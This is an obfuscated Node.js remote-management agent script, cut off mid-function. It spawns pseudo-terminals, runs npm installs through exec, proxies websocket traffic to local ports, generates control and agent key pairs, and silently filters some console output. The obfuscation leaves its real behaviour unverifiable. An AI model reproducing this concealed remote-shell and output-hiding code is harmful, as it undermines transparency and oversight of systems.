#!/usr/bin/env node
const a0d9 = a0b;
(function (a, b) {
    const d8 = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(d8(0xff1)) / 0x1 * (parseInt(d8(0x6bb)) / 0x2) + -parseInt(d8(0x961)) / 0x3 * (parseInt(d8(0xce9)) / 0x4) + parseInt(d8(0x80c)) / 0x5 + -parseInt(d8(0x4b9)) / 0x6 * (parseInt(d8(0x27a)) / 0x7) + parseInt(d8(0xe06)) / 0x8 + -parseInt(d8(0xde7)) / 0x9 + -parseInt(d8(0x4fb)) / 0xa * (-parseInt(d8(0x100e)) / 0xb);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x85b90));
const a0c = [
    a0d9(0x1f8),
    a0d9(0x24a),
    a0d9(0xec7)
];
function a0d(a) {
    const da = a0d9, b = {
            'sDwvz': function (c, d) {
                return c === d;
            },
            'lKJfM': da(0xd40),
            'WXeRO': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const db = da, g = c[db(0x43a)]();
        if (a0c[db(0x286)](h => g['includes'](h))) {
            if (b[db(0x72c)](typeof f, b[db(0xf1b)]))
                b[db(0x1f2)](f);
            return !![];
        }
        return a[db(0xfd2)](this, arguments);
    };
}
process[a0d9(0x681)][a0d9(0xc5e)] = a0d(process[a0d9(0x681)][a0d9(0xc5e)]), process[a0d9(0x1034)][a0d9(0xc5e)] = a0d(process[a0d9(0x1034)][a0d9(0xc5e)]);
const a0f = require(a0d9(0x4ae)), a0g = require(a0d9(0x13a)), a0h = require(a0d9(0xda4)), a0i = require(a0d9(0xab9)), a0j = require(a0d9(0xeb3)), a0k = require(a0d9(0x226)), a0l = require('fs'), a0m = require('fs')[a0d9(0x798)], a0n = require(a0d9(0xb83)), a0o = require(a0d9(0x4fa)), a0p = require('os'), a0q = require('readline'), {
        exec: a0r,
        spawn: a0s
    } = require(a0d9(0xbb4)), a0t = require(a0d9(0xb3d)), a0u = require(a0d9(0x3a2)), {encrypt: a0v} = require('eciesjs'), a0w = require(a0d9(0xa60)), a0x = require('express-ws'), a0y = require(a0d9(0x165));
function a0z() {
    const dc = a0d9, a = {
            'SGsqJ': dc(0x5d6),
            'eHgVR': dc(0xec2)
        };
    try {
        const b = a0o[dc(0xd9d)](__dirname, a[dc(0x192)]);
        if (!a0l[dc(0x8de)](b))
            return;
        for (let c of a0l[dc(0x976)](b, a[dc(0x361)])['split'](/\r?\n/)) {
            let d = c[dc(0x5b0)]();
            if (!d || d[dc(0x1ba)]('#'))
                continue;
            if (d[dc(0x1ba)](dc(0x6d8)))
                d = d[dc(0x47b)](0x7)[dc(0x9fe)]();
            const f = d[dc(0xe0a)]('=');
            if (f <= 0x0)
                continue;
            const g = d[dc(0x47b)](0x0, f)[dc(0x5b0)]();
            let h = d[dc(0x47b)](f + 0x1)['trim']();
            h[dc(0xc54)] >= 0x2 && (h[dc(0x1ba)]('\x22') && h['endsWith']('\x22') || h['startsWith']('\x27') && h[dc(0x102a)]('\x27')) && (h = h[dc(0x47b)](0x1, -0x1));
            if (g && !(g in process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C = null, a0D = null, a0E = null, a0F = ![];
const a0G = a0d9(0x8e8), a0H = a0d9(0x25b);
function a0I() {
    const dd = a0d9, a = {
            'pFTft': dd(0x6a3),
            'GQUAE': dd(0xb29),
            'EfwSa': dd(0x18f)
        };
    if (process[dd(0x4a4)] !== a['pFTft'])
        return null;
    try {
        const b = process[dd(0xb5b)][dd(0xd08)]();
        if (b[dd(0x1e8)] && b[dd(0x1e8)][dd(0x432)])
            return a['GQUAE'];
        if ((b[dd(0xcfe)] || [])['some'](c => /(?:ld-musl|libc\.musl)/[dd(0xf92)](String(c))))
            return a[dd(0xe5f)];
    } catch (c) {
    }
    return null;
}
function a0J(a) {
    const de = a0d9, b = {
            'lVZql': function (d, f) {
                return d !== f;
            },
            'PTFtV': function (d) {
                return d();
            },
            'pkcAx': function (d, f) {
                return d === f;
            },
            'MqJnb': 'musl',
            'qGbTw': de(0x500),
            'bDZUd': de(0x21c)
        }, c = b['lVZql'](a, undefined) ? a : b[de(0x71d)](a0I);
    if (b[de(0x266)](c, b['MqJnb']))
        return [
            b['qGbTw'],
            b[de(0xeab)]
        ];
    return [
        b[de(0xeab)],
        b[de(0x71e)]
    ];
}
const a0K = [
    a0d9(0x730),
    a0d9(0xcf0),
    a0d9(0xc8e),
    a0d9(0xc71),
    a0d9(0x457),
    a0d9(0xe34),
    a0d9(0x308)
][a0d9(0xd9d)]('\x0a');
function a0L(a) {
    const df = a0d9, b = {
            'hwSVa': function (c, d) {
                return c(d);
            },
            'wtKUJ': function (c, d) {
                return c(d);
            },
            'QpfFW': function (c, d, f) {
                return c(d, f);
            },
            'JqHkB': df(0x6d1),
            'MdFRA': function (c, d) {
                return c === d;
            },
            'yizcC': df(0x689),
            'RlbgP': function (c, d, f, g) {
                return c(d, f, g);
            },
            'QpPvI': df(0xed4),
            'QfaHj': 'pipe',
            'qFBBO': df(0xe83),
            'cAMLe': function (c, d, f) {
                return c(d, f);
            },
            'pFwsb': df(0xfcc)
        };
    return new Promise(c => {
        const di = df, d = {
                'vXEth': function (l, m) {
                    const dg = a0b;
                    return b[dg(0x7a9)](l, m);
                },
                'gTiaX': function (l, m) {
                    return l > m;
                },
                'eudGA': function (l, m, n) {
                    const dh = a0b;
                    return b[dh(0x6ca)](l, m, n);
                },
                'nzuIP': b[di(0x2c9)],
                'gFpya': function (l, m, n) {
                    return b['QpfFW'](l, m, n);
                },
                'xODJq': function (l, m) {
                    return b['MdFRA'](l, m);
                },
                'sZqaT': b[di(0x33d)]
            };
        let f;
        try {
            f = require['resolve'](a);
        } catch (l) {
            b[di(0x7a9)](c, {
                'ok': ![],
                'detail': di(0xa72)[di(0x83f)](b['wtKUJ'](String, l['message'])[di(0xa6a)]('\x0a')[0x0])
            });
            return;
        }
        const g = b[di(0xf1f)](a0s, process['execPath'], [
            '-e',
            a0K
        ], {
            'cwd': a0p['tmpdir'](),
            'env': {
                ...process.env,
                'KISAMA_PTY_PROBE_PATH': f
            },
            'stdio': [
                b[di(0xdf3)],
                b[di(0xdf3)],
                b[di(0xae3)]
            ]
        });
        let h = '';
        if (g[di(0x1034)])
            g[di(0x1034)]['on'](b[di(0x4d8)], m => {
                const dj = di;
                h += d[dj(0x5f0)](String, m);
                if (d[dj(0x6d5)](h[dj(0xc54)], 0x7d0))
                    h = h['slice'](-0x7d0);
            });
        let i = ![];
        const j = (m, n) => {
                !i && (i = !![], b['hwSVa'](c, {
                    'ok': m,
                    'detail': n
                }));
            }, k = b[di(0x7dd)](setTimeout, () => {
                const dk = di;
                try {
                    g[dk(0x3e3)]();
                } catch (m) {
                }
                d['eudGA'](j, ![], d[dk(0x8f7)]);
            }, 0x3a98);
        g['on'](b[di(0x3fb)], m => {
            const dl = di;
            d[dl(0x5f0)](clearTimeout, k), d['gFpya'](j, ![], dl(0xc76)[dl(0x83f)](m[dl(0x769)]));
        }), g['on'](di(0x1ce), (m, n) => {
            const dm = di;
            d[dm(0x5f0)](clearTimeout, k);
            if (d[dm(0x17c)](m, 0x0))
                j(!![], 'ok');
            else
                d['eudGA'](j, ![], dm(0xe05)['concat'](m, dm(0x5ac))[dm(0x83f)](n)[dm(0x83f)](h ? d['sZqaT'] + h[dm(0x5b0)]()[dm(0xa6a)]('\x0a')[dm(0xbfa)]() : ''));
        });
    });
}
function a0M() {
    const dn = a0d9;
    return process[dn(0xffa)][0x1] && a0o[dn(0x7e4)](a0o[dn(0x5a0)](process[dn(0xffa)][0x1])) || process[dn(0x1075)]();
}
function a0N(a) {
    const dp = a0d9, b = {
            'KdXEA': function (j, k) {
                return j(k);
            },
            'TWsoO': function (j, k) {
                return j(k);
            },
            'qNqOq': function (j, k) {
                return j(k);
            },
            'CtIjT': function (j, k) {
                return j !== k;
            },
            'JJeok': 'glibc',
            'kLjqs': function (j) {
                return j();
            },
            'kSrGK': dp(0xe1f),
            'XGSul': dp(0xc56),
            'XKUeJ': dp(0x330)
        };
    if (a0F)
        return Promise['resolve'](![]);
    a0F = !![];
    const c = a0I();
    if (c !== dp(0x18f) && b[dp(0x45f)](c, b[dp(0xfad)]))
        return Promise[dp(0x5a0)](![]);
    const d = dp(0x2a6)[dp(0x83f)](process[dp(0xa05)], '-')['concat'](c), f = ''[dp(0x83f)](d, '@')[dp(0x83f)](a0G), g = b[dp(0xcfc)](a0M);
    if (!a0l[dp(0x8de)](a0o['join'](g, b[dp(0x28f)])))
        return b[dp(0xbf0)](a, dp(0x90d)['concat'](g, dp(0x205))), Promise['resolve'](![]);
    if (a0l['existsSync'](a0o[dp(0xd9d)](g, 'pnpm-lock.yaml')))
        return b[dp(0x5e4)](a, 'npm\x20自愈跳过:\x20检测到\x20pnpm-lock.yaml\x20(pnpm\x20部署,\x20npm\x20install\x20会阻塞),\x20平台包缺失时可手动:\x20pnpm\x20add\x20'[dp(0x83f)](f)), Promise['resolve'](![]);
    const h = dp(0x161)['concat'](a0G), i = b[dp(0xc1e)] + b[dp(0xb95)];
    return a(dp(0xced)[dp(0x83f)](h, '\x20')['concat'](f, dp(0xba6))[dp(0x83f)](g, ')')), new Promise(j => {
        const dq = dp;
        a0r(dq(0x3d6)[dq(0x83f)](h, '\x20')['concat'](f, '\x20')[dq(0x83f)](i), {
            'cwd': g,
            'timeout': 0xafc8,
            'windowsHide': !![]
        }, k => {
            const dr = dq;
            if (k) {
                b[dr(0x5e4)](a, dr(0x44f)['concat'](b['KdXEA'](String, k[dr(0x769)])[dr(0xa6a)]('\x0a')[0x0])), b[dr(0xbf0)](j, ![]);
                return;
            }
            b[dr(0xbf0)](a, dr(0xd16)[dr(0x83f)](h, '\x20+\x20')[dr(0x83f)](f)), b[dr(0xd28)](j, !![]);
        });
    });
}
function a0O(a, b, c) {
    const ds = a0d9, d = { 'fFVjV': ds(0xe1f) };
    return a0o['join'](a0o[ds(0x7e4)](a), '..', ds(0xcd7)[ds(0x83f)](c, '-')[ds(0x83f)](b), d[ds(0x54e)]);
}
async function a0P(a, b) {
    const dt = a0d9, c = {
            'LoSGl': function (m) {
                return m();
            },
            'VMOad': function (m, n, o, p) {
                return m(n, o, p);
            },
            'sYhVQ': function (m, n) {
                return m(n);
            },
            'cQose': function (m, n) {
                return m(n);
            },
            'hoybC': function (m, n) {
                return m(n);
            },
            'hvEie': function (m, n) {
                return m + n;
            },
            'LNmCw': function (m, n) {
                return m(n);
            },
            'usKys': function (m) {
                return m();
            },
            'DGwMs': dt(0x2de),
            'iyhHe': function (m, n) {
                return m(n);
            }
        }, f = b || {}, g = f[dt(0x3be)] || c[dt(0x6b9)](a0J), h = f[dt(0xac7)] || a0N, i = f[dt(0x74a)] || a0L, j = f[dt(0xca9)] || (m => require(m)), k = f[dt(0x240)] || a0I, l = f['resolveQwqoMain'] || (() => require[dt(0x5a0)](dt(0x2c3)));
    for (const m of g) {
        if (m['startsWith'](dt(0x1b3))) {
            const p = k();
            if (p) {
                let q = null;
                try {
                    q = c[dt(0xc84)](a0O, l(), p, process[dt(0xa05)]);
                } catch (r) {
                    q = null;
                }
                if (q && !a0l[dt(0x8de)](q)) {
                    c[dt(0x6a0)](a, dt(0xf43)[dt(0x83f)](p, dt(0xf11)));
                    const s = await c['sYhVQ'](h, a);
                    a(s ? dt(0xa6f)[dt(0x83f)](m, '\x20预检自愈完成,\x20继续加载与探测') : dt(0xa6f)[dt(0x83f)](m, '\x20预检自愈未完成,\x20继续尝试加载与探测'));
                }
            }
        }
        let n = null;
        try {
            n = c[dt(0xc61)](j, m);
        } catch (t) {
            c['hoybC'](a, dt(0xa6f)[dt(0x83f)](m, dt(0xe9d))[dt(0x83f)](t && t['code'] ? c[dt(0xd73)](t[dt(0x503)], '\x20') : '')[dt(0x83f)](c[dt(0x984)](String, t && t[dt(0x769)])[dt(0xa6a)]('\x0a')[0x0]));
            continue;
        }
        const o = await c[dt(0x984)](i, m);
        if (o['ok'])
            return a('pty\x20实现选定:\x20'[dt(0x83f)](m, dt(0xbc2))[dt(0x83f)](c['usKys'](a0I) || c[dt(0x44c)], ')')), {
                'name': m,
                'mod': n
            };
        c[dt(0x6fc)](a, dt(0xa6f)['concat'](m, dt(0x3af))[dt(0x83f)](o[dt(0x4f2)]));
    }
    return null;
}
function a0Q() {
    const du = a0d9, a = {
            'RpysR': function (b, c) {
                return b + c;
            },
            'AOlDK': du(0x1c1),
            'pSuqd': function (b, c) {
                return b + c;
            },
            'zgpkm': du(0x4d4),
            'bRoYB': function (b) {
                return b();
            },
            'QMvJn': du(0x685),
            'UEksK': '\x20(musl\x20环境需\x20node\x20>=\x2020.19\x20支持\x20require(esm));\x20@lydell\x20预编译二进制不兼容\x20musl'
        };
    if (a0C || a0D)
        return Promise[du(0x5a0)](a0C);
    return !a0E && (a0E = a0P(b => {
        const dv = du;
        try {
            a0R['info']('[PTY]\x20'[dv(0x83f)](b));
        } catch (c) {
            console[dv(0x4c7)](a[dv(0x176)](a['AOlDK'], b));
        }
    })[du(0xdcb)](b => {
        const dw = du;
        return b ? a0C = b['mod'] : a0D = a[dw(0x176)](a['pSuqd'](a['zgpkm'], dw(0x39e)[dw(0x83f)](process[dw(0xa05)], '-')['concat'](a[dw(0x1aa)](a0I) || dw(0xb27), '@')[dw(0x83f)](a0G, dw(0x191))) + a[dw(0x47c)], a[dw(0x5b7)]), a0C;
    })), a0E;
}
if (typeof Bun !== a0d9(0xab7))
    try {
        a0C = require('bun-pty');
    } catch (a0d6) {
        a0D = a0d9(0x64d) + a0d6[a0d9(0x769)];
    }
else {
    if (process[a0d9(0x4a4)] !== a0d9(0x6a3))
        try {
            a0C = require(a0d9(0x21c));
        } catch (a0d7) {
            a0D = a0d9(0x14c) + a0d7[a0d9(0x769)] + a0d9(0x7e6);
        }
}
const a0R = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const dx = a0d9, a = {
                'Jkxia': function (b, c) {
                    return b !== c;
                },
                'sxBaD': dx(0xab7)
            };
        return a[dx(0xfa5)](typeof a0aE, a[dx(0xa94)]) && a0aE['LOG_LEVEL'] !== undefined ? a0aE[dx(0x48a)] : 0x2;
    },
    'debug': a => {
        const dy = a0d9, b = {
                'FHZKj': function (c, d) {
                    return c <= d;
                }
            };
        b['FHZKj'](a0R[dy(0x8e0)], a0R[dy(0x9a1)][dy(0x6c0)]) && console[dy(0x4c7)](dy(0x9eb)[dy(0x83f)](a));
    },
    'info': a => {
        const dz = a0d9, b = {
                'WoThd': function (c, d) {
                    return c <= d;
                }
            };
        b['WoThd'](a0R[dz(0x8e0)], a0R[dz(0x9a1)][dz(0xfc1)]) && console[dz(0x4c7)]('\x1b[36m[INFO]\x1b[0m\x20'[dz(0x83f)](a));
    },
    'warn': a => {
        const dA = a0d9, b = {
                'jWdNw': function (c, d) {
                    return c <= d;
                }
            };
        b[dA(0x67b)](a0R[dA(0x8e0)], a0R[dA(0x9a1)][dA(0x4c9)]) && console[dA(0x4c7)](dA(0x71c)[dA(0x83f)](a));
    },
    'error': a => {
        const dB = a0d9, b = {
                'kYPPq': function (c, d) {
                    return c <= d;
                }
            };
        b[dB(0x616)](a0R[dB(0x8e0)], a0R[dB(0x9a1)][dB(0x82d)]) && console['log'](dB(0x3f3)[dB(0x83f)](a));
    }
};
function a0S() {
    const dC = a0d9, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p['homedir'](),
            process[dC(0x1075)]()
        ];
    for (const b of a) {
        if (b && a0l['existsSync'](b) && a0l[dC(0x91f)](b)[dC(0x6f4)]())
            return b;
    }
    return process[dC(0x1075)]();
}
function a0T() {
    const dD = a0d9;
    let a = null;
    try {
        a = a0p[dD(0xfc4)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[dD(0x8de)](d) && a0l['statSync'](d)[dD(0x6f4)]())
            return d;
        if (d)
            console[dD(0x4c7)](dD(0xe76)[dD(0x83f)](d));
    }
    return console[dD(0x4c7)](dD(0x275)[dD(0x83f)](process[dD(0x1075)]())), process['cwd']();
}
class a0U {
    constructor(a = 'ok') {
        this['status'] = a;
    }
}
class a0V extends a0U {
    constructor(a = 'ok', b = 0x0) {
        const dE = a0d9;
        super(a), this[dE(0x101a)] = b;
    }
}
class a0W extends a0U {
    constructor() {
        const dF = a0d9;
        super(), this['arch'] = '', this[dF(0x513)] = 0x0, this[dF(0x31b)] = '', this['disk_total'] = 0x0, this[dF(0xb4e)] = '', this['ipv4'] = null, this[dF(0xa3a)] = null, this['mem_total'] = 0x0, this['os'] = '', this[dF(0x74d)] = '', this['swap_total'] = 0x0, this[dF(0x227)] = a0aE['AGENT_VERSION'], this[dF(0x1f0)] = '', this[dF(0x3d5)] = [], this[dF(0x29f)] = '', this[dF(0x8d8)] = null;
    }
}
class a0X extends a0U {
    constructor() {
        const dG = a0d9, a = { 'QWYwk': dG(0xe23) }, b = a[dG(0xe46)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[dG(0x159)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '1':
                this[dG(0x52e)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '2':
                this['connections'] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '3':
                this['disk'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this[dG(0xc94)] = { 'usage': 0x0 };
                continue;
            case '5':
                this[dG(0x769)] = '';
                continue;
            case '6':
                this[dG(0xe75)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '7':
                this[dG(0x542)] = 0x0;
                continue;
            case '8':
                super();
                continue;
            case '9':
                this[dG(0x261)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                this[dG(0xd15)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0Y extends a0U {
    constructor() {
        const dH = a0d9, a = dH(0xde3)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[dH(0x1009)] = '';
                continue;
            case '1':
                this[dH(0x536)] = 0x0;
                continue;
            case '2':
                this['cmd'] = '';
                continue;
            case '3':
                super();
                continue;
            case '4':
                this[dH(0x7e0)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0Z {
    constructor() {
        const dI = a0d9, a = { 'epdSj': '7|3|6|0|2|4|5|1' }, b = a[dI(0x232)][dI(0xa6a)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[dI(0x885)] = 0x0;
                continue;
            case '1':
                this['owner'] = '';
                continue;
            case '2':
                this['mtime'] = '';
                continue;
            case '3':
                this[dI(0x4fa)] = '';
                continue;
            case '4':
                this[dI(0x56f)] = '';
                continue;
            case '5':
                this[dI(0xdbb)] = '';
                continue;
            case '6':
                this[dI(0xa49)] = '';
                continue;
            case '7':
                this[dI(0x94b)] = '';
                continue;
            }
            break;
        }
    }
}
class a0a0 {
    constructor() {
        const dJ = a0d9, a = { 'OMmop': '2|7|6|5|1|3|4|0' }, b = a[dJ(0xc7e)][dJ(0xa6a)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['executable'] = ![];
                continue;
            case '1':
                this[dJ(0xa49)] = '';
                continue;
            case '2':
                this[dJ(0x4fa)] = '';
                continue;
            case '3':
                this[dJ(0x328)] = ![];
                continue;
            case '4':
                this[dJ(0xf24)] = ![];
                continue;
            case '5':
                this[dJ(0xdbb)] = '';
                continue;
            case '6':
                this[dJ(0x56f)] = '';
                continue;
            case '7':
                this['name'] = '';
                continue;
            }
            break;
        }
    }
}
class a0a1 extends a0U {
    constructor() {
        const dK = a0d9;
        super(), this[dK(0x1007)] = [];
    }
}
class a0a2 {
    static [a0d9(0x504)]() {
        const dL = a0d9, a = {
                'EGjJg': 'x25519',
                'AgqLE': dL(0x94a),
                'TKCvF': dL(0x8c3),
                'FNVbM': function (i, j) {
                    return i !== j;
                },
                'vqMYw': function (i, j) {
                    return i !== j;
                },
                'UarTm': dL(0x66e)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[dL(0x8d9)](a[dL(0x103f)]), d = b[dL(0xc4c)]({ 'format': a[dL(0xe0d)] }), f = c[dL(0xc4c)]({ 'format': a[dL(0xe0d)] }), g = Buffer[dL(0xca5)](d['d'], a[dL(0xe3e)]), h = Buffer[dL(0xca5)](f['x'], a[dL(0xe3e)]);
        return (a[dL(0x4d5)](g['length'], 0x20) || a[dL(0x27f)](h[dL(0xc54)], 0x20)) && a0R['error'](dL(0x39f)), {
            'private_b64': g[dL(0x43a)](a['UarTm']),
            'public_b64': h[dL(0x43a)](a[dL(0x899)])
        };
    }
    static [a0d9(0xf31)](a) {
        const dM = a0d9, b = this[dM(0x504)]();
        return {
            'role': a,
            'private_b64': b['private_b64'],
            'public_b64': b['public_b64']
        };
    }
    static ['generatePair'](a = a0d9(0x53c), b = a0d9(0x886)) {
        const c = {
            'control': this['generateSingle'](a),
            'agent': this['generateSingle'](b)
        };
        return c;
    }
}
const a0a3 = new Set([
        a0d9(0x4e4),
        a0d9(0xcf8),
        a0d9(0x698),
        a0d9(0xf5a),
        a0d9(0x17f),
        a0d9(0xefc),
        a0d9(0xa03)
    ]), a0a4 = /^[a-z0-9][a-z0-9-]{1,62}$/, a0a5 = new Set([
        a0d9(0x9dd),
        'keep-alive',
        a0d9(0xb28),
        a0d9(0x551),
        'te',
        a0d9(0xfe2),
        a0d9(0x50e),
        a0d9(0x6c4),
        a0d9(0xfe6),
        'host'
    ]);
function a0a6(a) {
    const dN = a0d9, b = {
            'nSAhL': function (d, f) {
                return d(f);
            },
            'SfrBc': function (d, f) {
                return d || f;
            },
            'GkKQs': function (d, f, g) {
                return d(f, g);
            },
            'cRwJu': function (d, f) {
                return d >= f;
            },
            'rsmXP': function (d, f) {
                return d <= f;
            }
        }, c = new Set();
    for (const d of b[dN(0x2a3)](String, b[dN(0x560)](a, ''))[dN(0xa6a)](',')) {
        const f = d[dN(0x5b0)]();
        if (!/^\d+$/[dN(0xf92)](f))
            continue;
        const g = b[dN(0xe62)](parseInt, f, 0xa);
        if (b[dN(0xea7)](g, 0x1) && b[dN(0x645)](g, 0xffff))
            c[dN(0xbcd)](g);
    }
    return [...c][dN(0xcd4)]((h, i) => h - i);
}
function a0a7(a) {
    const dO = a0d9, b = { 'HmZPp': dO(0x9dc) }, c = (a || '')['trim']()['toLowerCase']();
    if (!c)
        return b[dO(0x826)];
    if (!a0a4[dO(0xf92)](c))
        return 'KNAME\x20\x27'[dO(0x83f)](a, '\x27\x20非法:\x20限\x202-63\x20字符小写字母/数字/连字符,\x20首位字母或数字');
    if (a0a3[dO(0xe1a)](c))
        return dO(0x3e7)[dO(0x83f)](a, dO(0xa5e));
    return null;
}
const a0a8 = /^https?:\/\/\S+$/;
function a0a9(a) {
    const dP = a0d9, b = {
            'XUGIE': function (d, f) {
                return d || f;
            },
            'jNueZ': function (d, f) {
                return d > f;
            }
        }, c = b[dP(0x9c1)](a, '')[dP(0x5b0)]()[dP(0x8d4)](/\/+$/, '');
    if (!c)
        return null;
    if (b[dP(0x84d)](c[dP(0xc54)], 0x200))
        return dP(0x97a)[dP(0x83f)](c['length'], dP(0x141));
    if (!a0a8['test'](c))
        return 'public_url\x20\x27'[dP(0x83f)](c, dP(0x7c6));
    return null;
}
function a0aa(a) {
    const dQ = a0d9, b = {
            'ZMYAp': function (d, f) {
                return d || f;
            },
            'vuxBP': dQ(0xe94),
            'DsHgW': function (d, f) {
                return d + f;
            },
            'jKtlU': dQ(0x61d),
            'gCIrK': function (d, f) {
                return d + f;
            },
            'fEOkv': function (d, f) {
                return d + f;
            },
            'YUGjc': dQ(0x1016)
        }, c = b['ZMYAp'](a, '')[dQ(0x5b0)]()[dQ(0x8d4)](/\/+$/, '');
    if (c[dQ(0x1ba)](b[dQ(0xc74)]))
        return b[dQ(0x1fc)](dQ(0xd2f), c[dQ(0x47b)](0x8)) + b[dQ(0xcb7)];
    if (c[dQ(0x1ba)]('http://'))
        return b[dQ(0xc36)]('ws://', c[dQ(0x47b)](0x7)) + b['jKtlU'];
    return b[dQ(0x1fc)](b['fEOkv'](b[dQ(0x462)], c), dQ(0x61d));
}
function a0ab(a) {
    const dR = a0d9, b = {
            'DopEU': function (d, f) {
                return d(f);
            },
            'qcpkA': dR(0x3c8),
            'Pmwor': dR(0x1ee)
        }, c = {};
    for (const [d, f] of Object[dR(0x77e)](a || {})) {
        const g = b['DopEU'](String, d)['toLowerCase']();
        if (a0a5[dR(0xe1a)](g) || g['startsWith'](b[dR(0xe17)]) || g[dR(0x1ba)](b[dR(0x516)]))
            continue;
        c[g] = f;
    }
    return c;
}
const a0ac = [
        'x-nonce',
        'x-timestamp',
        a0d9(0xff3),
        'x-aes-encrypted',
        a0d9(0x635),
        a0d9(0xd4b)
    ], a0ad = 'hub', a0ae = 'local', a0af = {
        [a0ad]: new Set(),
        [a0ae]: new Set()
    };
function a0ag(a) {
    const dS = a0d9, b = {
            'KNcui': function (c, d) {
                return c === d;
            },
            'PPogy': function (c, d) {
                return c === d;
            }
        };
    return b['KNcui'](a, a0ad) ? Array['isArray'](a0aE[dS(0x1d0)]) ? a0aE[dS(0x1d0)] : [] : b[dS(0x4c6)](a, a0ae) ? Array[dS(0xedd)](a0aE['KPROXY_PORTS']) ? a0aE[dS(0x3f5)] : [] : [];
}
function a0ah(a) {
    const dT = a0d9;
    return [...a0af[a] || new Set()][dT(0xcd4)]((c, d) => c - d);
}
function a0ai() {
    return {
        [a0ad]: a0ah(a0ad),
        [a0ae]: a0ah(a0ae)
    };
}
function a0aj(a) {
    const dU = a0d9;
    return [...new Set([
            ...a0ag(a),
            ...a0af[a] || new Set()
        ])][dU(0xcd4)]((c, d) => c - d);
}
function a0ak(a) {
    const dV = a0d9, b = {
            'lotYc': function (d, f) {
                return d === f;
            },
            'XQNFG': 'boolean',
            'QezxE': function (d, f) {
                return d(f);
            },
            'uFecP': function (d, f) {
                return d > f;
            }
        }, c = new Set();
    for (const d of a || []) {
        if (b[dV(0xcdc)](typeof d, b[dV(0xfa6)]))
            continue;
        const f = b[dV(0x3c5)](Number, d);
        if (!Number[dV(0x63f)](f) || f < 0x1 || b[dV(0x2d8)](f, 0xffff))
            continue;
        c['add'](f);
    }
    return c;
}
function a0al(a, b) {
    const dW = a0d9, c = {
            'khibL': function (f, g) {
                return f(g);
            }
        };
    if (!a0af[a])
        a0af[a] = new Set();
    const d = c[dW(0x37d)](a0ak, b);
    a0af[a]['clear']();
    for (const f of d)
        a0af[a][dW(0xbcd)](f);
}
function a0am(a, b) {
    const c = {
        'lbGLB': function (f, g) {
            return f(g);
        }
    };
    if (!a0af[a])
        a0af[a] = new Set();
    const d = c['lbGLB'](a0ak, b);
    for (const f of d)
        a0af[a]['add'](f);
}
async function a0an(a, b) {
    const dX = a0d9, c = {
            'bdcWj': function (n, o) {
                return n === o;
            },
            'wnNXe': dX(0x9ff),
            'CsOnA': function (n, o, p) {
                return n(o, p);
            },
            'ybpoR': function (n, o) {
                return n < o;
            },
            'yUhBj': function (n, o) {
                return n > o;
            },
            'Fqkwn': function (n, o) {
                return n + o;
            },
            'oxOML': dX(0x3c6),
            'xcZlW': function (n, o) {
                return n(o);
            },
            'HZUeC': function (n, o) {
                return n(o);
            },
            'Pcuwo': dX(0xdfc),
            'ZqRFP': dX(0x74e),
            'SHqJB': function (n, o) {
                return n + o;
            },
            'yJqWB': dX(0xefa),
            'kkCCi': dX(0x7c9),
            'eahEK': dX(0x769),
            'VZPZm': dX(0x76b)
        }, d = c['CsOnA'](parseInt, b[dX(0x528)][dX(0x5c6)], 0xa);
    if (!Number[dX(0x63f)](d) || c['ybpoR'](d, 0x1) || c[dX(0xd65)](d, 0xffff)) {
        a[dX(0x76b)](0x3f0, c[dX(0xaf9)](c[dX(0x994)], c['xcZlW'](String, b['params'][dX(0x5c6)])['slice'](0x0, 0x50)));
        return;
    }
    if (!c[dX(0x1045)](a0aj, a0ae)[dX(0x152)](d)) {
        a[dX(0x76b)](0x3f0, c[dX(0xaf9)](c[dX(0xd4e)] + d, c[dX(0x40f)]));
        return;
    }
    const f = b[dX(0x528)][0x0] || '', g = b[dX(0x9db)][dX(0x152)]('?') ? b['url'][dX(0x47b)](c[dX(0xaf9)](b['url'][dX(0xe0a)]('?'), 0x1)) : '', h = 'ws://127.0.0.1:'[dX(0x83f)](d, '/')['concat'](f)[dX(0x83f)](g ? c[dX(0x581)]('?', g) : ''), i = {};
    for (const [n, o] of Object[dX(0x77e)](b[dX(0x57f)] || {})) {
        const p = c['HZUeC'](String, n)['toLowerCase']();
        if (a0a5[dX(0xe1a)](p) || p[dX(0x1ba)](c[dX(0x910)]) || p[dX(0x1ba)](dX(0x3c8)))
            continue;
        if (a0ac[dX(0x152)](p))
            continue;
        i[n] = Array[dX(0xedd)](o) ? o[0x0] : o;
    }
    let j;
    try {
        j = new a0cP(h, { 'headers': i });
    } catch (q) {
        a[dX(0x76b)](0x3f3, String(q && q[dX(0x769)] || q)[dX(0x47b)](0x0, 0x64));
        return;
    }
    const l = [];
    let m = ![];
    j['on'](c[dX(0x7c4)], () => {
        const dY = dX;
        m = !![];
        for (const r of l)
            j[dY(0x871)](r[dY(0xe83)], { 'binary': r[dY(0x77c)] });
        l['length'] = 0x0;
